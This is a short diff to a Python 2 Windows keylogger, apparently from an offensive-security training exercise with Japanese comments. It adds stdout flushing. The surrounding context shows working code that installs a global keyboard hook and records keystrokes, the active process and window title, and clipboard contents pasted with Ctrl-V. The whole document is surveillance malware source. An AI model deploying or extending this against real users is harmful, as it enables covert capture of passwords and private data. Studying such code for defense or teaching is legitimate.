@@ -3,6 +3,7 @@ from ctypes import *
 import pythoncom
 import pyHook 
 import win32clipboard
+import sys
 
 user32   = windll.user32
 kernel32 = windll.kernel32
@@ -35,6 +36,7 @@ def get_current_process():
     print
     print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
     print
+    sys.stdout.flush()
   
 
     # ハンドルのクローズ
@@ -53,6 +55,7 @@ def KeyStroke(event):
     # 標準的なキーが押下されたかチェック
     if event.Ascii > 32 and event.Ascii < 127:
         print chr(event.Ascii),
+        sys.stdout.flush()
     else:
         # [Ctrl-V]が押下されたならば、クリップボードのデータを取得
         if event.Key == "V":
@@ -60,8 +63,10 @@ def KeyStroke(event):
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
             print "[PASTE] - %s" % (pasted_value),
+            sys.stdout.flush()
         else:
             print "[%s]" % event.Key,
+            sys.stdout.flush()
 
     # 登録済みの次のフックに処理を渡す
     return True
